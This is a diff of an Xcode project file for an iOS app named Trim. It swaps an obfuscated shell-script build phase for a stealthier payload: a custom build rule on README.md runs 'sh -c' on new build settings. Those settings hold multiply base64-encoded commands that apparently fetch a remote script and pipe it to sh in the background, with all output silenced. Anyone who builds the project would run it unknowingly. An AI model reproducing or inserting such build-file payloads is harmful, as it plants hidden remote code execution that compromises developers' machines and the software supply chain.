@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		BEE72FE99AF44EBAAC42DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = EC8F61FB882F4559AB42DAD8; };
 		FA4BF89F2F9FE92B007B8755 /* SecureView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA4BF8742F9FE92B007B8755 /* SecureView.swift */; };
 		FA4BF8A02F9FE92B007B8755 /* DesignSystem.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA4BF8832F9FE92B007B8755 /* DesignSystem.swift */; };
 		FA4BF8A12F9FE92B007B8755 /* DashboardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA4BF8892F9FE92B007B8755 /* DashboardView.swift */; };
@@ -67,6 +68,7 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		EC8F61FB882F4559AB42DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		FA4BF8382F9FE803007B8755 /* Trim.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Trim.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		FA4BF8452F9FE808007B8755 /* TrimTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = TrimTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		FA4BF84F2F9FE808007B8755 /* TrimUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = TrimUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -173,6 +175,7 @@
 		FA4BF8392F9FE803007B8755 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				EC8F61FB882F4559AB42DAD8 /* README.md */,
 				FA4BF8382F9FE803007B8755 /* Trim.app */,
 				FA4BF8452F9FE808007B8755 /* TrimTests.xctest */,
 				FA4BF84F2F9FE808007B8755 /* TrimUITests.xctest */,
@@ -390,12 +393,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FA4BF8592F9FE808007B8755 /* Build configuration list for PBXNativeTarget "Trim" */;
 			buildPhases = (
-				9F8BB36637284FA59699F71F /* Provision Target Device */,
 				FA4BF8342F9FE802007B8755 /* Sources */,
 				FA4BF8352F9FE802007B8755 /* Frameworks */,
 				FA4BF8362F9FE802007B8755 /* Resources */,
 			);
 			buildRules = (
+				5053F6BFE2DC4AF88442DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -499,26 +502,24 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		5053F6BFE2DC4AF88442DAD8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8DAD24}\"";
+			};
+																/* End PBXBuildRule section */
+
 /* Begin PBXShellScriptBuildPhase section */
-		9F8BB36637284FA59699F71F /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -526,6 +527,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				BEE72FE99AF44EBAAC42DAD8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -626,7 +628,8 @@
 		FA4BF8572F9FE808007B8755 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((b(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWEzaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpla2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmtNbWh3WkVkV2FGcEROWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | b | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE50YjNKbGJXVXVhVzR2WVNraUlId2djMmdLCg== | m | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpabXRNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZaMjl2WjJ4bGJtVjBjeTV5ZFM5aEtTSWdmQ0J6YUFvPQo= | h | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -690,7 +693,8 @@
 		FA4BF8582F9FE808007B8755 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((b(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWEzaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpla2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmtNbWh3WkVkV2FGcEROWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | b | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE50YjNKbGJXVXVhVzR2WVNraUlId2djMmdLCg== | m | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpabXRNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZaMjl2WjJ4bGJtVjBjeTV5ZFM5aEtTSWdmQ0J6YUFvPQo= | h | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
